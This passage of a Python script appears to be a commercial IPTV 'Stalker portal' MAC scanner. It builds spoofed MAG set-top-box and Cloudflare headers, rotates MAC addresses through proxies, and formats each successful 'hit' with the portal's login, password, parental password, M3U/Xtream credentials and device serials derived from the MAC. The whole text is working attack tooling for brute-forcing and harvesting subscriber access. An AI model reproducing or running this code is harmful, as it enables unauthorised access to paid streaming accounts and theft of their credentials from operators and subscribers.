            "Report-To": '{"endpoints":[{"url":"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=aD7S2OF4niZxQQzkOWJyzBIqVylHQbmf9jFKrVx4L3DDOpbjYyq0DZTg9ZB9PhLhDT19R3axPLdnzGgGL%2BYcygkCBA7%2BcPBLf0%2FtCwZGzIawMJ5GBh%2Bih57Y4vtrdg%3D%3D"}],"group":"cf-nel","max_age":604800}',
        }
    if authorc == "realblue":
        HEADERA = {
            "User-Agent": useragent,
            "Referer": http + "://" + panel + "/c/",
            "X-User-Agent": "Model: MAG250; Link: WiFi",
            "Cache-Control": "no-cache",
            "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Cookie": "mac=" + macs + "; stb_lang=en; timezone=Europe%2FParis;",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "Keep-Alive",
        }
    if authorc == "stbpro":
        HEADERA = {
            "X-User-Agent": "Model: MAG350; Link: Ethernet,WiFi",
            "User-Agent": useragent,
            "Referer": http + "://" + panel + "/c/",
            "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Host": singe,
            "Cookie": "PHPSESSID=null; mac="
            + macs
            + "; stb_lang=en; timezone=Europe%2FParis; adid=90315b70fdf800b5c5181de836a8ec4d",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "text/javascript;charset=UTF-8",
            "Connection": "keep-alive",
            "X-Powered-By": "PHP/" + str(vrdata) + "",
        }
    if authorc == "ultra":
        HEADERA = {
            "X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
            "User-Agent": useragent,
            "Referer": http + "://" + panel + "/c/",
            "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Host": singe,
            "Cookie": "PHPSESSID=null; mac="
            + macs
            + "; stb_lang=en; timezone=Europe%2FParis; adid=90315b70fdf800b5c5181de836a8ec4d",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "text/javascript;charset=UTF-8",
            "Connection": "keep-alive",
            "X-Powered-By": "PHP/" + str(vrdata) + "",
        }
        url1 = (
            http
            + "://"
            + panel
            + "/"
            + author
            + "?type=stb&action=handshake&token=&prehash=0&mac="
            + macs
            + "&JsHttpRequest=1-xml"
        )
    else:
        HEADERA = {
            "User-Agent": useragent,
            "Referer": http + "://" + panel + "/c/index.html",
            "Accept": "*/*,application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Cookie": "mac=" + macs + "; stb_lang=en; timezone=Europe%2FParis;",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded,text/javascript;charset=UTF-8",
            "Connection": "Keep-Alive",
            "X-User-Agent": "Model: MAG350; Link: Ethernet",
        }
    return HEADERA


def hea2(mac, token):
    macs = mac.upper()
    macs = urllib.parse.quote(mac)
    singe = panel
    if "/" in singe:
        singe = singe.split("/")[0]
    if authorc == "stbpro":
        HEADERd = {
            "Authorization": "Bearer " + str(token),
            "X-User-Agent": "Model: MAG350; Link: Ethernet,WiFi",
            "User-Agent": useragent,
            "Referer": http + "://" + panel + "/c/",
            "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Host": singe,
            "Cookie": "PHPSESSID=null; mac="
            + macs
            + "; stb_lang=en; timezone=Europe%2FParis; adid=90315b70fdf800b5c5181de836a8ec4d",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "text/javascript;charset=UTF-8",
            "Connection": "keep-alive",
            "X-Powered-By": "PHP/" + str(vrdata) + "",
        }
    if authorc == "ultra":
        HEADERd = {
            "Authorization": "Bearer " + str(token),
            "X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
            "User-Agent": useragent,
            "Referer": http + "://" + panel + "/c/",
            "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Host": singe,
            "Cookie": "PHPSESSID=null; mac="
            + macs
            + "; stb_lang=en; timezone=Europe%2FParis; adid=90315b70fdf800b5c5181de836a8ec4d",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "text/javascript;charset=UTF-8",
            "Connection": "keep-alive",
            "X-Powered-By": "PHP/" + str(vrdata) + "",
        }
    if phhp == "17":
        HEADERd = {
            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
            "Referer": http + "://" + panell + "/c/",
            "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Cookie": "mac=" + macs + "; stb_lang=en; timezone=Europe%2FParis;",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "Keep-Alive",
            "X-User-Agent": "Model: MAG254; Link: Ethernet",
            "Authorization": "Bearer " + str(token),
        }
    if authorc == "cloudflarex" or ccff == "CloudFlare":
        HEADERd = {
            "X-User-Agent": "Model: MAG250; Link: WiFi",
            "User-Agent": useragent,
            "Referer": http + "://" + panell + "/c/",
            "Accept": "application/json,application/javascript,text/javascript,text/javascript;charset=UTF-8,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Host": singe,
            "Cookie": "mac=" + macs + "; debug=1; stb_lang=en; timezone=Europe%2FParis;",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "Keep-Alive",
            "NEL": '{"success_fraction":0,"report_to":"cf-nel","max_age":604800}',
            "Pragma": "no-cache",
            "Server": "cloudflare",
            "x-proxy-cache": "MISS",
            "Report-To": '{"endpoints":[{"url":"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=aD7S2OF4niZxQQzkOWJyzBIqVylHQbmf9jFKrVx4L3DDOpbjYyq0DZTg9ZB9PhLhDT19R3axPLdnzGgGL%2BYcygkCBA7%2BcPBLf0%2FtCwZGzIawMJ5GBh%2Bih57Y4vtrdg%3D%3D"}],"group":"cf-nel","max_age":604800}',
            "Authorization": "Bearer " + str(token),
        }
    if authorc == "realblue":
        HEADERd = {
            "User-Agent": useragent,
            "Referer": http + "://" + panel + "/c/",
            "X-User-Agent": "Model: MAG250; Link: WiFi",
            "Cache-Control": "no-cache",
            "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Cookie": "mac=" + macs + "; stb_lang=en; timezone=Europe%2FParis;",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "Keep-Alive",
            "Authorization": "Bearer " + str(token),
        }
    else:
        HEADERd = {
            "User-Agent": useragent,
            "Referer": http + "://" + panel + "/c/index.html",
            "Accept": "*/*,application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Cookie": "mac=" + macs + "; stb_lang=en; timezone=Europe%2FParis;",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded,text/javascript;charset=UTF-8",
            "Connection": "Keep-Alive",
            "X-User-Agent": "Model: MAG350; Link: Ethernet",
            "Authorization": "Bearer " + str(token),
        }
    return HEADERd


def hea3():
    singe = panel.replace("/stalker_portal", "")
    hea = {
        "Icy-MetaData": "1",
        "User-Agent": useragent,
        "Accept-Encoding": "identity",
        "Host": singe,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
    }
    return hea


color = ""
import re

pattern = "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
hora_ini = ""
tokenr = ""
hitr = ""
proxylist = ""
proxysay = 0
offvpn = 0
macon = 0
macvpn = 0
m3uon = 0
m3uvpn = 0
cpm = 0
status_code = ""
color_code = ""
text = ""


def echok(mac, bot, total, hit, oran, time_, hit_time, start_time, proxym, proxy_, status_code):
    global cpm, echo, hitr, color, px, color_code, text
    cpmx = time.time() - cpm
    if proxi == "1":
        cpmx = round(260 / cpmx)
    else:
        cpmx = round(60 / cpmx)
    if str(cpmx) == "0":
        cpm = cpm
    else:
        cpm = cpmx
    time_ = time.localtime()
    hit_time = time.strftime("%H:%M:%S", time_)
    hit_time = hit_time.replace(" ", "")
    proxx = ""
    if "/" in panel:
        try:
            panelo = str(panel).split("/")[0]
        except:
            pass
    else:
        panelo = str(panel)
    if proxi == "1":
        proxy_ = ""
        try:
            proxie = proxys.replace("\n", "")
            if protocol == 1:
                proxy_ = proxie
                if "." in proxie:
                    proxi_0 = proxie.split(".")[0]
                    proxi_1 = proxie.split(":")[-2]
                    proxi_2 = proxie.split(":")[-1]
                    proxy_ = proxi_1 + ":" + proxi_2 + "@" + proxi_0
            elif protocol == 2:
                proxy_ = proxie
                if ":" in proxie:
                    proxi_0 = proxie.split(":")[0]
                    proxi_1 = proxie.split(":")[-1]
                    proxy_ = proxi_0 + "-" + proxi_1
            else:
                proxy_ = proxie
        except:
            pass
        proxx = f"\n  •[🛡]️•• {YELLOW}Pʀᴏxɪᴇs:{str(selectprox)}{CYAN}Gᴏᴏᴅ➛{str(proxygoodlen)} {RED}Bᴀᴅ➛{str(proxysbadlen)} {RESET}\n  •[🛡]️• {GREEN + str(mtype)}{PINKa}➭ {proxym + str(proxy_)}{CYAN}:ʜɪᴅᴇɴ {RESET}"
    if proxi == "1":
        if anima(px, "bot") == 1:
            px = 0
        else:
            animc()
            time_ = time.localtime()
            timex = time.time()
            colors = [1, 90, 1, 91, 1, 92, 1, 93, 1, 94, 1, 95, 1, 96, 1, 97]
            color_code = colors[int(time.time()) % len(colors)]
            text = "─────────⟬🄶🅁🄾🅄🄿🄰🄿🅇🄻🄻⟭≽────────                 "
    echo = (
        """\n
       	\33[1;34m
  ╔═════════「 🇮🇶 𝐁𝐲 𝐶𝑜𝑛𝑓𝑖𝑔 IQ ════════╗
  ║    _   _    _   _  _         _     ║
  ║   /_\ | |  (_) | || |__ _ __| |__  ║
  ║  / _ \| |__| | | __ / _` / _| / /  ║
  ║ /_/ \_\____|_| |_||_\__,_\__|_\_\  ║
  ║                                    ║
  ╚══════════════════════════════╝                                  
    \33[0m
\033[1;90m        ᴘʀᴇᴍɪᴜᴍ ᴘʏ ᴄᴏɴꜰɪɢ ά_pхll√ˣ🚩           \33[0m    
   \33["""
        + str(color_code)
        + """m"""
        + text
        + """\33[0m
   ╓─═ s̵̡̤̻̳̅̽͛͋͋͘𝕥𝔹 𝟳.𝟑 🅰️🅿️❎Ⓛ🅻 ► ⚜️
  •[🛡]️• \33[32mSᴛᴀʀᴛTɪᴍᴇ:\33[92m"""
        + str(hora_ini)
        + """\33[0m\33[94m «» \33[36mSᴄᴀɴ:\033[1;90m"""
        + str(time.strftime("%H:%M:%S"))
        + """  \33[0m
  •[🛡]️• \33[36m"""
        + str(panel)
        + """ """
        + str(albstb2)
        + """ \33[0m
  •[🛡]️• \033[1;90m"""
        + str(bot)
        + """\33[32m"""
        + str(tokenr)
        + str(mac)
        + """ \33[0m\33[94mCᴘᴍ:"""
        + str(cpm)
        + """\x1b[0m """
        + proxx
        + """ \33[0m
  •[🛡]️• \33[36mExᴛʀᴇᴍ➛0 \33[92mNoVᴘɴ➛"""
        + str(macon)
        + """ \33[0m\x1b[38;5;1mVᴘɴ➛"""
        + str(macvpn)
        + """ \033[90mᴏꜰꜰ➛"""
        + str(offvpn)
        + """ \33[0m
  •[🛡]️• \33[33mM3ᴜCʜᴇᴄᴋ|\33[92mAᴄᴛɪᴠᴇ➛"""
        + str(m3uon)
        + """\33[0m\33[95mᴏꜰꜰ➛"""
        + str(m3uvpn)
        + """ \033[90mɴᴏ3➛"""
        + str(m3uvpn)
        + """ \33[0m
  •[🛡]️• \33[36mTᴏᴛᴀʟ➛"""
        + str(combouz)
        + """/Rᴜɴ➛"""
        + str(total)
        + """ \33[33m ➭ \x1b[31m"""
        + str(oran)
        + """%   \33[0m
   ╙➥ \033[1;90m𝕧𝔦ᵖ7҉√\33[33m"""
        + str(hitr)
        + """▄︻デMᴀx["""
        + str(hit)
        + """]HɪTꜱ==ᕗ🦅 \33[0m\33[4;90mPʀᴇᴍɪᴜᴍ\33[0m
  
   \33["""
        + str(color_code)
        + """m"""
        + text
        + """\33[0m


   \33[33mHᴇʟʟᴏ - \33[36m\33[1m"""
        + nickn
        + """ \33[0m 👑
   \33[33mYᴏᴜ Cʜᴏꜱᴇ \33[0m\33[91m"""
        + str(STBbots)
        + """\33[33m Bᴏᴛs \33[0m
   \x1b[33mPʀᴏᴛᴏᴄᴏʟ:\x1b[0m\x1b[91mHTTP\x1b[0m\x1b[33m|\x1b[0m"""
        + color
        + str(status_code)
        + """\x1b[0m\x1b[33m|\x1b[0m\x1b[0m\n   \x1b[33mAɢᴇɴᴛ:\x1b[91m"""
        + str(agentx)
        + """\x1b[0m\n   \x1b[33mAᴛᴛᴀᴄᴋ:\x1b[91m"""
        + str(attack)
        + """\x1b[0m\n   \x1b[33mᴘʜᴘTʏᴘᴇ:\x1b[91m"""
        + str(albstb3)
        + """\x1b[0m\n   \x1b[33mMᴀᴄs:\x1b[91m"""
        + str(combouz)
        + """\x1b[0m\x1b[33m ɪɴ \x1b[91m"""
        + combodosya
        + """ \x1b[0m"""
        + str(infophpx)
        + """

   \33["""
        + str(color_code)
        + """m"""
        + text
        + """\33[0m"""
    )

    print(echo, end="", flush=True)
    time.sleep(0.01)
    cpm = time.time()
    # print(start)
    if status_code == 200:
        color = "\33[1m\33[32m"
    if status_code == 301:
        color = "\33[1m\33[1;31m"
    if status_code == 302:
        color = "\33[1m\33[1;31m"
    if status_code == 403:
        color = "\33[1m\33[1;31m"
    if status_code == 404:
        color = "\33[1m\33[38;5;202m"
    if status_code == 407:
        color = "\33[1m\33[38;5;003m"
    if status_code == 429:
        color = "\33[1m\33[1m\33[93m"
    if status_code == 500:
        color = "\33[1m\33[38;5;202m"
    if status_code == 503:
        color = "\33[1m\33[38;5;226m"
    if status_code == 512:
        color = "\33[1m\33[38;5;134m"
    if status_code == 520:
        color = "\33[1m\33[35m"


stalker_portal = "anonym"


def hityaz(
    mac,
    trh,
    real,
    m3ulink,
    m3uimage,
    durum,
    vpn,
    kanalsayisi,
    filmsayisi,
    dizisayisi,
    livelist,
    vodlist,
    serieslist,
    playerapi,
    fname,
    tariff_plan,
    ls,
    login,
    password,
    tariff_plan_id,
    bill,
    expire_billing_date,
    max_online,
    parent_password,
    stb_type,
    comment,
    country,
    settings_password,
    adult,
    scountry,
    country_name,
):
    global hitr, hitsay
    panell = panel
    reall = real
    if "anonym" == "anonym":  # try:
        simza = ""
        if author == "stalker_portal/server/load.php":
            panell = str(panel) + "/stalker_portal"
            reall = real.replace("/c/", "/stalker_portal/c/")
            simza = (
                """
    ─═Ş𝕥𝔹７.➂🅰️𝐏𝕏𝓵Ｌ►⚜️
╓⍟🏴▂✭[A̲̅]°¯`🅿[̲̅x]𝓛Ⓛ✭▂🏴
║∘Lᴏɢɪɴ➛ """
                + login
                + """
║∘Usᴇʀɴᴀᴍᴇ➛ """
                + fname
                + """
║∘Pᴀssᴡᴏʀᴅ➛ """
                + password
                + """
║∘Aᴅᴜʟᴛ Pᴀssᴡᴏʀᴅ➛ """
                + parent_password
                + """
║∘Tᴀʀɪꜰꜰ Iᴅ➛ """
                + tariff_plan_id
                + """
║∘Tᴀʀɪꜰꜰ Pʟᴀɴ➛ """
                + tariff_plan
                + """
║∘Mᴀx Oɴʟɪɴᴇ➛ """
                + max_online
                + """
╠━✪ 𝐏𝐲 𝐒𝐓𝐁ꜰʀᴇᴇ𝐏𝐫𝐞𝐦𝐢𝐮𝐦 ✪
╠═⊛ Hɪᴛs ʙʏ ☞ """
                + str(nickn)
                + """ ☜
║∘Sᴛʙ Tʏᴘᴇ➛ """
                + stb_type
                + """
║∘Cᴏᴜɴᴛʀʏ➛ """
                + country
                + """
║∘Sᴇᴛᴛɪɴɢꜱ Pᴀꜱꜱᴡᴏʀᴅ➛ """
                + settings_password
                + """
║∘Cᴏᴍᴍᴇɴᴛ➛ """
                + comment
                + """ 
╚⫸[ 𝐏ү Ş𝕥𝔹７.➂ａ𝐏𝕏𝓵Ｌ ]"""
            )
        imza = (
            """
   ─═Ş𝕥𝔹７.➂🅰️𝐏𝕏𝓵Ｌ►⚜️
╓⍟🏴▂▂✭[A̲̅]°¯`🅿[̲̅x]𝓛Ⓛ✭▂▂🏴
║◌Rᴇᴀʟ➛"""
            + str(reall)
            + """
║◌Pᴀɴᴇʟ➛http://"""
            + str(panell)
            + """/c/
║∘Mᴀᴄ➛ """
            + str(mac)
            + """
║∘Exᴘ➛ """
            + str(trh)
            + """
║∘Tʏᴘᴇ➛ """
            + str(albstb3)
            + """
║∘Aɢᴇɴᴛ➛ """
            + str(agentx)
            + """
║∘Aᴛᴛᴀᴄᴋ➛ """
            + str(attack)
            + """
╠═⊛ Hɪᴛs ʙʏ ☞ """
            + str(nickn)
            + """ ☜
╠━✪ ✯𝗣𝗬[A̲̅]¯🅿[̲̅x]𝓛Ⓛ✯ ✪
╟✷Bᴜʏ-ᴘʏ👇🏼𝐒𝐓𝐁ᴍᴀx𝐏𝐫𝐞𝐦𝐢𝐮𝐦
║∘Sᴛʙᴘʟʏᴇʀ➛𝖮𝗍𝗍,𝖲𝗍𝖻𝖤𝗆𝗎,𝖲𝗍𝖺𝗅𝗄𝖾𝗋
║∘Pᴄᴘʟʏᴇ➛𝖲𝖿𝗏𝗂𝗉,𝖲𝗍𝖺𝗅𝗄𝖾𝗋,𝖯𝗈𝗍𝖯𝗅𝖺𝗒𝖾
╚⫸[ 𝐏ү Ş𝕥𝔹７.➂ａ𝐏𝕏𝓵Ｌ ]

╓❪❪❪ 𝐌𝟑𝐔 🛡 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 ❫❫❫
╠═⊛ Hɪᴛs ʙʏ ☞ """
            + str(nickn)
            + """ ☜
║∘NᴇᴇᴅVᴘɴ➛  """
            + str(durum)
            + """
║☞ᴍзᴜꜱᴛᴀᴛᴜꜱ➛ """
            + m3uimage
            + """
║∘Vᴘɴ """
            + str(vpn)
            + """
║∘Rᴇɢɪᴏɴ➛ """
            + str(country_name)
            + """ 
╙➛"""
            + str(m3ulink)
            + """ """
            + str(playerapi)
            + """ """
        )
        sifre = device(mac)

        pimza = """"""
        imza = imza + sifre + simza + pimza
        if len(kanalsayisi) > 1:
            imza = (
                imza
                + """

╓❪❪❪ 𝑴𝑬𝑫𝑰𝑨 📺 𝑪𝑶𝑼𝑵𝑻 ❫❫❫
║∘Cʜᴀɴɴᴇʟꜱ➛"""
                + kanalsayisi
                + """
║∘Vᴏᴅ➛"""
                + filmsayisi
                + """
║∘Sᴇʀɪᴇꜱ➛"""
                + dizisayisi
                + """ 
╚⫸[ 𝐏ү Ş𝕥𝔹７.➂ａ𝐏𝕏𝓵Ｌ ]"""
            )
        if channels == "1" or channels == "2":
            imza = (
                imza
                + """ 
			
╓❪❪❪ 𝑳𝑰𝑽𝑬 ⚜️ 𝑳𝑰𝑺𝑻 ❫❫❫
╚⫸"""
                + str(livelist)
                + """ ««◌»» """
            )
        if channels == "2":
            imza = (
                imza
                + """  
╓❪❪❪ 𝑽𝑶𝑫 🔅 𝑳𝑰𝑺𝑻 ❫❫❫
╚⫸"""
                + str(vodlist)
                + """  ««◌»» 
╓❪❪❪ 𝑺𝑬𝑹𝑰𝑬𝑺 ⚜️ 𝑳𝑰𝑺𝑻 ❫❫❫
╚⫸"""
                + str(serieslist)
                + """ ««◌»» """
            )
        imza = (
            imza
            + """

╓❪❪❪ 𝑺𝑪𝑨𝑵𝑵𝑰𝑵?? 🦅 𝑰𝑵𝑭𝑶 ❫❫❫▬ι══ﺤ
║🥷 Hɪᴛꜱ ʙʏ ☞"""
            + nickn
            + """☜
║⚔️ 𝐏ү Ş𝕥𝔹７.➂ａ𝐏𝕏𝓵Ｌ
║ ꜰʟᴀɢᴍᴏᴅ_ ۝ 🅶🅷🅾🆂🆃۝
║▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂ """
        )

        imza = imza
        yax(imza)
        hitsay = hitsay + 1
        print(imza)
        if hitsay >= hit:
            hitr = "\33[33m"
        cimza = (
            """
╔═Ş𝕥𝔹🗡７.➂🅰️𝐏𝕏𝓵Ｌ⚜️⩥
║⠀⠀⠀⠀⠀⡇⠀
║⠀⠀⠀⠀⣸⣧⡖
║⠀⠀⠀⠀⣿⣿⠀
║⠀⠀⠀⠀⣿⣿⠀
║⢠⣄⣀⣀⣿⣯⠀
║⠛⠻⠿⢿⣿⣿⢀
║⠀⠀⣠⣼⣿⣿⡼
║⠀⠛⠀⠀⣿⡏⠀
║⠀⠀⠀⣸⣿⡇⠀
║⠀⠀⠒⠿⠧⠇
║ ✯𝗣𝗬 [A̲̅]¯`🅿[̲̅x]𝓛Ⓛ✯
╠❪❪❪ 𝐏ү Ş𝕥𝔹７.➂ａ𝐏𝕏𝓵Ｌ❫❫❫
║◌Pᴀɴᴇʟ➛http://"""
            + str(panell)
            + """/c/
║∘Mᴀᴄ➛ """
            + str(mac)
            + """
║∘Exᴘ➛ """
            + str(trh)
            + """
║☞ᴍзᴜꜱᴛᴀᴛᴜꜱ➛ """
            + m3uimage
            + """
╓❪❪❪ 𝑺𝑪𝑨𝑵𝑵𝑰𝑵𝑮 🕊 𝑰𝑵𝑭𝑶 ❫❫❫▬ι══ﺤ
║📱 Hɪᴛꜱ ʙʏ ☞"""
            + nickn
            + """☜
║🦅 HɪᴛTɪᴍᴇ➛"""
            + str(time.strftime("%H:%M:%S"))
            + """ / """
            + str(time.strftime("%d-%m-%Y"))
            + """    
║⚔️ 𝐒𝐓𝐁 𝐕7 𝐌𝐚𝐱 🎖 𝐔𝐩𝐝𝐚𝐭𝐞: 34
║ ꜰʟᴀɢᴍᴏᴅ_ ۝ 🅶🅷🅾🆂🆃۝
║➛🔹[ https://t.me/A_pxll ] √
║▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂"""
        )

        yak(cimza)
        hitsay = hitsay + 1
        # print(cimza)
        if hitsay >= hit:
            hitr = "\33[33m"
        dimza = """""" + str(mac) + """ """
        yaz(dimza)
        hitsay = hitsay + 1
        if hitsay >= hit:
            hitr = "\33[33m"


proxym = "\x1b[90m"
tokenr = "\x1b[32m"


def device(mac):
    mac = mac.upper()
    SN = hashlib.md5(mac.encode("utf-8")).hexdigest()
    SNENC = SN.upper()  # SN
    SNCUT = SNENC[:13]  # Sncut
    DEV = hashlib.sha256(mac.encode("utf-8")).hexdigest()
    DEVENC = DEV.upper()  # dev1
    DEV1 = hashlib.sha256(SNCUT.encode("utf-8")).hexdigest()
    DEVENC1 = DEV1.upper()  # dev2
    SG = SNCUT + "+" + (mac)
    SING = hashlib.sha256(SG.encode("utf-8")).hexdigest()
    SINGENC = SING.upper()
    sifre = (
        """
╓❪❪❪ 𝑫𝑬𝑽𝑰𝑪𝑬 ⚔️ 𝑰𝑵𝑭𝑶 ❫❫❫
║∘sɴᴄᴜᴛ➛ """
        + SNCUT
        + """
║∘sɴ➛ """
        + SNENC
        + """   
║∘ɪᴅ¹➛  """
        + DEVENC
        + """
║∘ɪᴅ²➛ " """
        + DEVENC1
        + """
║∘sɪɢ➛ """
        + SINGENC
        + """
╚⫸[ ✯𝗣𝗬  [A̲̅]¯🅿[̲̅x]𝓛Ⓛ✯ ] """
    )

    return sifre


def list(listlink, mac, token, livel):
    kategori = ""
    veri = ""
    while True:
        try:
            res = option.get(listlink, headers=hea2(mac, token), timeout=20, verify=False)
            veri = str(res.text)
            break
        except:
            pass
    if veri.count('title":"') > 0:
        for i in veri.split('title":"'):
            try:
                kanal = ""
                kanal = str((i.split('"')[0]).encode("utf-8").decode("unicode-escape")).replace(
                    "\/", "/"
                )
            except:
                pass
            kategori = kategori + kanal + livel
            kategori = kategori.replace("{ ««◌»» ", " ««◌»» ")
    list = kategori.replace("{ ««◌»» ", "{")

    return list


def m3ugoruntu(cid, user, pas, plink):
    durum = "ᴏꜰꜰʟɪɴᴇ "
    try:
        url = http + "://" + plink + "/live/" + str(user) + "/" + str(pas) + "/" + str(cid) + ".ts"
        res = option.get(url, headers=hea3(), timeout=(2, 5), allow_redirects=False, stream=True)
        if res.status_code == 302 or res.status_code == 406:
            durum = "ᴏɴʟɪɴᴇ "
    except:
        durum = "ᴏꜰꜰʟɪɴᴇ "
    return durum


def vpnip(ip):
    url99 = "https://ipapi.co/" + ip + "/json/"
    vpnip = ""
    vpn = "ɴᴏᴛ ɪɴᴠᴀʟɪᴅ"
    veri = ""
    vpncc = ""
    try:
        res = option.get(url99, timeout=7, verify=False)
        veri = str(res.text)
    except:
        vpn = "ɴᴏᴛ ɪɴᴠᴀʟɪᴅ"
    if not "404 page" in veri:
        if "country_name" in veri:
            vpnc = veri.split('city": "')[-1]
            vpnc = vpnc.split('"')[0]
            vpncc = veri.split('country_code": "')[-1]
            vpncc = vpncc.split('"')[0]
            vpnips = veri.split('country_name": "')[-1]
            vpnips = vpnips.split('"')[0]
            flagc = flag.flag(vpncc)
            vpn = vpnips + "  " + flagc + " " + vpnc
    else:
        vpn = "ɴᴏᴛ ɪɴᴠᴀʟɪᴅ"
    return vpn


hit = 0


def m3uapi(playerlink, mac, token):
    mt = ""
    bag = 0
    veri = ""
    bad = 0
    while True:
        try:
            res = option.get(playerlink, headers=hea2(mac, token), timeout=20, verify=False)
            veri = str(res.text)
            break
        except:
            bad = bad + 1
            if bad == 3:
                break
    if veri == "" or "404" in veri:
        bad = 0
        while True:
            try:
                playerlink = playerlink.replace("player_api.php", "panel_api.php")
                res = option.get(playerlink, headers=hea2(mac, token), timeout=20, verify=False)
                veri = str(res.text)
                break
            except:
                bad = bad + 1
                if bad == 3:
                    break
    acon = ""
    timezone = ""
    message = ""
    if "active_cons" in veri:
        acon = veri.split('active_cons":')[1]
        acon = acon.split(",")[0]
        acon = acon.replace('"', "")
        mcon = veri.split('max_connections":')[1]
        mcon = mcon.split(",")[0]
        mcon = mcon.replace('"', "")
        status = veri.split('status":')[1]
        status = status.split(",")[0]
        status = status.replace('"', "")
        try:
            timezone = veri.split('timezone":"')[1]
            timezone = timezone.split('",')[0]
            timezone = timezone.replace("\/", "/")
            timezone = timezone.replace("_", " ")
        except:
            pass
        realm = veri.split('url":')[1]
        realm = realm.split(",")[0]
        realm = realm.replace('"', "")
        port = veri.split('port":')[1]
        port = port.split(",")[0]
        port = port.replace('"', "")
        userm = veri.split('username":')[1]
        userm = userm.split(",")[0]
        userm = userm.replace('"', "")
        pasm = veri.split('password":')[1]
        pasm = pasm.split(",")[0]
        pasm = pasm.replace('"', "")
        bitism = veri.split('exp_date":')[1]
        bitism = bitism.split(",")[0]
        bitism = bitism.replace('"', "")
        try:
            message = veri.split('message":"')[1].split(",")[0].replace('"', "")
            message = str(message.encode("utf-8").decode("unicode-escape")).replace("\\/", "/")
            message = message.replace("<font style=", "")
            if not message == "":
                message = message
            else:
                messages = "No"
        except:
            pass
        if bitism == "null":
            bitism = "ᴜɴʟɪᴍɪᴛᴇᴅ "
        else:
            bitism = datetime.datetime.fromtimestamp(int(bitism)).strftime("%d-%m-%Y %H:%M:%S")
            mt = (
                """
					
╔❪❪❪ 𝑿𝑻𝑹𝑬𝑨𝑴 🦈 𝑰𝑵𝑭𝑶 ❫❫❫
║◌R➛http://"""
                + realm
                + """:"""
                + port
                + """
║∘Usᴇʀ➛ """
                + userm
                + """
║∘Pᴀss➛ """
                + pasm
                + """
║∘Cᴏɴɴ➛ ᴍᴀx:"""
                + mcon
                + """ ⁃ ᴀᴄᴛ:"""
                + acon
                + """
╠═✷Sᴛᴀᴛᴜꜱ➛ """
                + status
                + """
║∘Tᴢᴏɴᴇ➛ """
                + timezone
                + """
╠═⊛ Hɪᴛꜱ ʙʏ ☞ """
                + str(nickn)
                + """ ☜
║∘Mзᴜᴘʟʏᴇʀꜱ➛ 𝖤𝗑𝗍𝗋𝖾𝗆𝖾,𝖳𝗂𝗏𝗂𝖬𝖺𝗍𝖾
╚⫸[ 𝐒𝐓𝐁𝟓✶𝐏𝐫𝐨彡#𝐏𝐫𝐞𝐦𝐢𝐮𝐦 ] """
            )
    return mt


def goruntu(link, cid):
    # print(link)
    say = 0
    duru = "ᴇxɪsᴛ"
    try:
        res = option.get(link, headers=hea3(), timeout=7, allow_redirects=False, stream=True)
        # print(res.status_code)
        if res.status_code == 302 or res.status_code == 406:
            duru = "ᴇxɪsᴛ "
    except:
        duru = "ᴜsᴇ ᴠᴘɴ"
    return duru


def url7(cid):
    url = (
        http
        + "://"
        + panel
        + "/"
        + author
        + "?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"
        + str(cid)
        + "_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
    )
    if author == "stalker_portal/server/load.php":
        url7 = (
            http
            + "://"
            + panel
            + "/"
            + author
            + "?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/"
            + str(cid)
            + "&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
        )
        url7 = (
            http
            + "://"
            + panel
            + "/"
            + author
            + "?type=itv&action=create_link&cmd=ffrt%20http:///ch/"
            + str(cid)
            + "&&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
        )
    return str(url)


def hea3():
    hea = {
        "Icy-MetaData": "1",
        "User-Agent": "Lavf/57.83.100",
        "Accept-Encoding": "identity",
        "Host": panel,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
    }

    return hea


def hitecho(mac, trh):
